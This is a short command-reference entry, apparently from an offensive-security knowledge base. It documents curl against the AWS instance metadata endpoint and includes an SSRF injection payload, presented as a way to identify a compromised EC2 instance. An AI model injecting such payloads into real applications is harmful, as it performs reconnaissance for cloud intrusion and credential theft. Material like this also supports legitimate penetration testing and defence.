---
id: d1a6380c-4fa5-40fb-a556-4b4e99909ca1
type: command
executor: bash
data: 'curl http://169.254.169.254/latest/meta-data/instance-id'
output: null
created_at: '2023-04-06T03:56:38.436835+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - AWS
  - Linux
tags:
  - ssrf
  - metadata
verified: true
validated: true
---

# curl-aws-metadata-id

## Command

```bash
curl http://169.254.169.254/latest/meta-data/instance-id
```

## Description

Retrieves the unique instance ID of an AWS EC2 instance via the Instance Metadata Service (IMDS). Use this in SSRF exploits to identify the compromised instance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | No additional parameters; uses default IMDS endpoint | Yes |

## Examples

### Basic Usage

```bash
curl http://169.254.169.254/latest/meta-data/instance-id
```

### In SSRF Context

Inject as payload: ?url=http://169.254.169.254/latest/meta-data/instance-id

## Expected Output

i-1234567890abcdef0

## Related

- [[procedures/Exploit-SSRF-to-Access-Cloud-Metadata]]
- [[commands/curl-aws-metadata-json]]
